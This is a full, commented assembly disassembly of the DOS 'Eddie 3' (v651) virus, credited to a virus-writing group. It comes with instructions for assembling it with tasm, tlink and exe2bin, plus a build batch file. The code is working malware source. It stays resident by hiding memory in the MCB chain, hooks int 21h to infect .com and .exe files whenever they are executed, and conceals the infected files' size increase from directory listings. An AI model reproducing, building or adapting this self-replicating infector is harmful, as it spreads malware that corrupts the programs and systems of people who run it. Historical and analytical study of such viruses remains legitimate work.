.model  tiny
.code

                org     0

;
;
;
;                      Disassembly of the Eddie 3 virus  a.k.a. v651
;
;
;                               by  PRiEST - Phalcon/Skism
;


;
;       The eddie 3 virus is a memory resident .com and .exe infector,
;       upon entry to the virus, eddie 3 will modify the MCB chain to hide
;       a portion of memory in which it will store itself.  It will also hook
;       int 21h, and int 24h during infection, and will infect programs
;       on calls to 4b00h (execute) only, and will also hide the file size 
;       increase on calls to 11h (find file fcb) and 12h (find next file 
;       fcb).  Eddie 3 will infect any .com file over 28bh and under 0fb75h 
;       bytes in size, .exe files will be infected if they are over 28bh
;       bytes.  This virus was written by the Dark Avenger.
;


;
;       To assemble, type the following:
;
; C:\>tasm eddie3 /m2
; C:\>tlink eddie3
; C:\>exe2bin eddie3 eddie3.com
;
; NOTE:  You may not use TLINK /T as it will fail since the ORG directive 
;        is below 100h, therefore it is quite necessary that you have 
;        exe2bin.
;



eddie_here      equ     0a55ah

psp_memory      equ     2h

disk_size       equ     disk_end - offset eddie
copy_size       equ     mem_end - offset eddie
mem_size        equ     eddie_end - offset eddie

exe_header_size equ     18h

marker          equ     1fh

read_only       equ     1




eddie:          call    $ + 3                   ; push IP
                pop     bx
                sub     bx,3                    ; get offset of eddie
                push    ax
                sub     ax,ax
                mov     es,ax                   ; segment of IVT
                mov     ax,es:[21h*4h]          ; get address of int 21h
                mov     word ptr cs:[bx.int_21],ax   
                mov     ax,es:[(21h*4h)+2h]
                mov     word ptr cs:[bx.int_21+2],ax  ; save address

                mov     ax,eddie_here           ; `are we here' call
                int     21h
                cmp     ax,not eddie_here       ; eddie is already here?
                je      quit_eddie
                
                mov     ax,sp                   
                inc     ax                      
                mov     cl,4h                   ; find SP in paragraphs
                shr     ax,cl
                inc     ax                      ; safety margin
                mov     cx,ss                   ; current segment
                add     ax,cx                   ; least possible amount of 
                                                ; memory, as used below

                mov     cx,ds
                dec     cx                      ; get segment of MCB
                mov     es,cx
                mov     di,psp_memory           ; amount of memory in psp
                mov     dx,((mem_size)/16)+1    ; size of eddie in memory
                mov     cx,ds:[di]              ; get amount of memory
                sub     cx,dx                   ; hide enough mem for eddie
                cmp     cx,ax                   ; enough memory left?
                jb      quit_eddie
                
                sub     es:[di+1],dx            ; fix MCB (di=2)
                mov     ds:[di],cx              ; fix psp memory field
                mov     es,cx                   ; hidden memory address
                mov     si,bx                   ; address of eddie
                sub     di,di                   ; to offset 0
                mov     cx,(copy_size+1)/2      ; size of eddie in words
                cld
                db      2eh                     ; from CS:
                rep     movsw

                
                mov     ax,es                   ; save hidden memory segment
                mov     es,cx                   ; ES = segment of IVT (0h)

                cli                             ; completely unnecessary
                
                mov     word ptr es:[21h*4h],offset eddie_21  ; hook int 21h
                
                mov     es:[(21h*4h)+2h],ax     ; segment of hidden memory
                sti
                

;****************************************************************************
; Jump to original host
;****************************************************************************

quit_eddie:     push    ds
                pop     es                      ; set ES to segment of 
                                                ; program
                mov     ax,cs:[bx.buffer]       ; get first two bytes of
                                                ; program
                cmp     ax,'ZM'                 ; .exe file?
                je      quit_eddie_exe
                cmp     ax,'MZ'                 ; .exe file?
                je      quit_eddie_exe

                mov     di,100h                 ; starting point of .com
                                                ; programs
                mov     ds:[di],ax              ; repair .com file (a
                                                ; STOSW, then STOSB in the 
                                                ; place of the upcoming 
                                                ; instructions would be
                                                ; more efficient)
                mov     al,byte ptr ds:[bx.buffer+2]  ; get third byte

                mov     ds:[di+2],al            ; restore third byte
                pop     ax                      ; restore original AX
                push    di                      ; 100h
                retn                            ; jump to .com program

quit_eddie_exe: pop     ax                      ; restore original AX
                mov     dx,ds                   ; psp segment
                add     dx,10h                  ; skip psp
                add     cs:[bx.exe_head_CS],dx  ; get CS of .exe
                add     dx,cs:[bx.exe_head_SS]  ; get SS of .exe
                mov     ss,dx
                mov     sp,cs:[bx.exe_head_SP]  ; get SP of .exe
                jmp     dword ptr cs:[bx.exe_head_IP] ; jump to .exe


;****************************************************************************
; Eddie's interrupt 21h handler
;****************************************************************************


eddie_21:       sti
                cmp     ax,4b00h                ; execute program?
                je      infect
                cmp     ah,11h                  ; find first file fcb?
                je      hide_eddie
                cmp     ah,12h                  ; find next file fcb?
                je      hide_eddie
                cmp     ax,eddie_here           ; looking for eddie?
                je      reply_eddie
                jmp     jump_21


;****************************************************************************
; Hide file size increase as well as the time marker
;****************************************************************************


hide_eddie:     pushf                           ; simulate an interrupt
                call    cs:int_21
                test    al,al                   ; did it find a file?
                jne     iret_21
                push    ax bx es                ; save return, etc.
                mov     bx,dx                   ; offset of fcb
                mov     al,ds:[bx]              ; get first byte, which tells
                                                ; if it's an extended fcb
                                                ; or a regular fcb
                push    ax                      ; save fcb signature
                mov     ah,2fh
                int     21h                     ; get address of DTA
                pop     ax                      ; fcb signature
                inc     al                      ; will equal 0 if extended
                                                ; fcb
                jne     hide_nextended
                add     bx,7h                   ; adjust pointer
hide_nextended: mov     ax,es:[bx.DS_time]      ; get seconds
                and     al,1fh                  ; and ONLY seconds
                cmp     al,marker               ; file infected?
                jne     hide_eddie_end
                
                and     byte ptr es:[bx.DS_time],not marker ; fix the time 
                                                            ; entry
                sub     word ptr es:[bx.DS_size],disk_size  ; fix file size
                
                sbb     word ptr es:[bx.DS_size+2],0h       ; subtract carry

hide_eddie_end: pop     es bx ax

iret_21:        iret


;****************************************************************************
; Respond to `are you here' call
;****************************************************************************

reply_eddie:    not     ax
                iret



;****************************************************************************
; infect files
;****************************************************************************


infect:         push    ds es ax bx cx dx si di
                mov     ax,3524h                ; get addres of int 24h
                int     21h
                push    es bx                   ; save address of int 24h
                push    ds dx                   ; save ptr to file
                push    cs
                pop     ds
                mov     dx,offset eddie_24      ; offset of eddie's int 24h
                                                ; handler
                mov     ax,2524h                ; hook int 24h
                int     21h
                
                pop     dx ds                   ; get ptr to file
                mov     ax,4300h                ; get attribute
                int     21h
                jnb     got_attr
                sub     cx,cx                   ; don't try to restore 
                                                ; attribute upon exit
                jmp     infect_done

got_attr:       push    cx                      ; save attribute
                test    cl,read_only            ; is file read only?
                je      open_file
                dec     cx                      ; read only attribute off
                mov     ax,4301h                ; set attribute
                int     21h

open_file:      mov     ax,3d02h                ; open file
                int     21h
                push    cs
                pop     ds
                jnb     get_date
                jmp     infect_done_attr        

get_date:       mov     bx,ax                   ; tsk-tsk, an XCHG BX,AX
                                                ; would fit better.
                mov     ax,5700h                ; get date of file
                int     21h
                jb      chain_close
                mov     al,cl                   ; seconds into AL
                or      cl,1fh                  ; mark it as infected
                cmp     al,cl                   ; already infected?
                jne     read_start

chain_close:    jmp     close

read_start:     push    cx dx                   ; save date/time
                mov     dx,offset buffer        ; buffer to hold data
                mov     cx,exe_header_size      ; size of .exe header
                mov     ah,3fh                  ; read file
                int     21h
                jb      chain_set_error
                sub     cx,ax                   ; all of header read?
                jne     chain_set_error
                
                les     ax,dword ptr ds:[buffer.eh_SS] ; get stack pointers
                mov     ds:exe_head_SP,es       ; save SP
                mov     ds:exe_head_SS,ax       ; save SS
                les     ax,dword ptr ds:[buffer.eh_IP] ; get code pointers
                mov     ds:exe_head_IP,ax       ; save IP
                mov     ds:exe_head_CS,es       ; save CS
                
                mov     dx,cx                   ; 00
                mov     ax,4202h                ; lseek to end of file
                int     21h
                jb      chain_set_error
                mov     ds:file_size_low,ax     ; save size of file
                mov     ds:file_size_high,dx

                mov     cx,disk_size            ; size of eddie on disk
                cmp     ax,cx                   ; too small
                sbb     dx,0h                   ; take into account that
                                                ; DX may be <> 0
                jb      chain_set_error
                call    is_file_exe             ; is file indeed an .exe type
                                                ; program?
                je      write_eddie
                cmp     ax,0fb75h               ; too big for .com files?
                jb      write_eddie

chain_set_error:jmp    set_error

write_eddie:    sub     dx,dx                   ; offset of eddie
                mov     ah,40h                  ; append eddie to program
                int     21h
                jb      chain_set_error
                sub     cx,ax                   ; all of eddie written?
                jne     chain_set_error
                
                mov     dx,cx                   ; 0
                mov     ax,4200h                ; lseek to start of program
                int     21h
                jb      chain_set_error
                
                mov     ax,ds:file_size_low     ; get size of file
                call    is_file_exe             ; is it an .exe?
                jne     make_com_jump
                mov     dx,ds:file_size_high    ; get high word of file size
                mov     cx,4h                   ; loop counter
                mov     si,ds:[buffer.eh_size_header]  ; get size of .exe

                                                ; header

                sub     di,di                   ; initialize to zero
make_exe_loop:  shl     si,1h                   ; convert header size to 
                                                ; bytes
                rcl     di,1                    ; ?? rotate the carry
                loop    make_exe_loop

                sub     ax,si                   ; IP upon entry to virus
                sbb     dx,di
                mov     cl,0ch                  ; shift mask
                shl     dx,cl                   ; high file size to segment
                                                ; displacement
                mov     ds:buffer.eh_IP,ax      ; set IP to eddie
                mov     ds:buffer.eh_CS,dx      ; set CS to eddie
                add     dx,((mem_size)/16)+7h   ; make a stack
                nop                             ; MASM! 
                mov     ds:buffer.eh_SP,ax      ; set SP to eddie's stack
                mov     ds:buffer.eh_SS,dx      ; set SS to eddie's stack
                
                add     word ptr ds:[buffer.eh_min_mem],9h  

                mov     ax,ds:[buffer.eh_min_mem] ; get minimum amount of 
                                                  ; memory needed
                cmp     ax,ds:[buffer.eh_max_mem] ; compare against max amount
                                                  ; of memory requested
                jb      make_exe_fix_no
                mov     ds:[buffer.eh_max_mem],ax ; fix it

make_exe_fix_no: mov     ax,ds:[buffer.eh_modulo] ; get modulo of 
                                                  ; file size/512
                add     ax,disk_size              ; add size of eddie
                push    ax
                and     ah,1                      ; 0-1ffh
                mov     ds:[buffer.eh_modulo],ax  ; save new modulo
                pop     ax
                mov     cl,09h
                shr     ax,cl                     ; divide by 512
                add     ds:[buffer.eh_size],ax    ; add (eddie's size)/512
                jmp     write_start

make_com_jump:  sub     ax,3h                     ; fix for jump displacement
                mov     byte ptr ds:[buffer],0e9h ; jmp ($+2)+xxxx
                mov     word ptr ds:[buffer+1],ax ; jump to end of file

write_start:    mov     dx,offset buffer        ; rewrite start of program
                mov     cx,exe_header_size
                mov     ah,40h                  ; write to file
                int     21h
                jb      set_error
                cmp     ax,cx                   ; bytes written?
                je      reset_date

set_error:      stc

reset_date:     pop     dx cx                   ; get date/time
                jb      close
                mov     ax,5701h                ; restore date
                int     21h     

close:          mov     ah,3eh
                int     21h

infect_done_attr:pop   cx                       ; get attribute

infect_done:    test    cl,read_only
                je      unhook_24
                mov     ax,4301h                ; set attribute
                int     21h

unhook_24:      pop     dx ds                   ; address of int 24h
                mov     ax,2524h                ; set address
                int     21h

                pop     di si dx cx bx ax es ds

jump_21:        jmp     cs:int_21



;****************************************************************************
; Eddie's int 24h handler; Return fail to any errors that occur
;****************************************************************************


eddie_24:       mov     al,3h
                iret


;****************************************************************************
; Is file an .exe type file?
;****************************************************************************

is_file_exe:    mov     si,ds:buffer            ; get first two bytes of 
                                                ; program
                cmp     si,'ZM'                 ; .exe file?
                je      is_file_exe_ret
                cmp     si,'MZ'
is_file_exe_ret:retn




copyright:      db      'Eddie lives',0




int_21          dd      0                       ; this didn't have to be
                                                ; written to disk.
mem_end:      

exe_head_IP     dw      0
exe_head_CS     dw      0
exe_head_SP     dw      0
exe_head_SS     dw      0


buffer          dw      20cdh
                db      0

disk_end:                
                
                db      15h dup(?)
                

file_size_low   dw      ?
file_size_high  dw      ?


eddie_end:




exe_Header      STRUC
EH_Signature    dw ?                    ; Set to 'MZ' or 'ZM' for .exe files
EH_Modulo       dw ?                    ; remainder of file size/512
EH_Size         dw ?                    ; file size/512
EH_Reloc        dw ?                    ; Number of relocation items
EH_Size_Header  dw ?                    ; Size of header in paragraphs
EH_Min_Mem      dw ?                    ; Minimum paragraphs needed by file
EH_Max_Mem      dw ?                    ; Maximum paragraphs needed by file
EH_SS           dw ?                    ; Stack segment displacement
EH_SP           dw ?                    ; Stack Pointer
EH_Checksum     dw ?                    ; Checksum, not used
EH_IP           dw ?                    ; Instruction Pointer of Exe file
EH_CS           dw ?                    ; Code segment displacement of .exe
exe_Header      ENDS

Directory       STRUC
DS_Drive        db ?
DS_Name         db 8 dup(0)
DS_Ext          db 3 dup(0)
DS_Attr         db ?
DS_Reserved     db 10 dup(0)
DS_Time         dw ?
DS_Date         dw ?
DS_Start_Clust  dw ?
DS_Size         dd ?
Directory       ENDS
                
                end     eddie

# -- build.bat --

del *.map
del *.obj
del *.com

rem Assemble EDDIE.ASM now
tasm eddie;
tlink eddie;
debug eddie.exe
